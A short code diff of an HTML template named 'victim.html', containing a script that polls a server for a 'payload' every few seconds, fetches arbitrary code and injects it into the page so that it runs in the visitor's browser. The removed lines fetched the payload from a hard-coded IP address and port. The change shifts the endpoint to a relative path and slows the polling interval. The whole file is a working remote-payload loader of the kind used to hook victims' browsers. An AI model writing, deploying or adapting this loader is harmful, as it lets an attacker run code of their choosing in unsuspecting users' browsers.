@@ -1,11 +1,13 @@
+<!-- /templates/victim.html -->
+
 <script>
 async function fetchAndRunPayload() {
     try {
-        const res = await fetch("http://192.168.28.128:5000/get_payload");
+        const res = await fetch("/get_payload");
         const payloadCode = await res.text();
         if (payloadCode) {
             const script = document.createElement("script");
-            script.type = "module";
+            script.type = "text/javascript";
             script.textContent = payloadCode;
             document.body.appendChild(script);
         }
@@ -14,6 +16,5 @@ async function fetchAndRunPayload() {
     }
 }
 
-// 1초마다 최신 payload 확인
-setInterval(fetchAndRunPayload, 1000);
+setInterval(fetchAndRunPayload, 5000);
 </script>
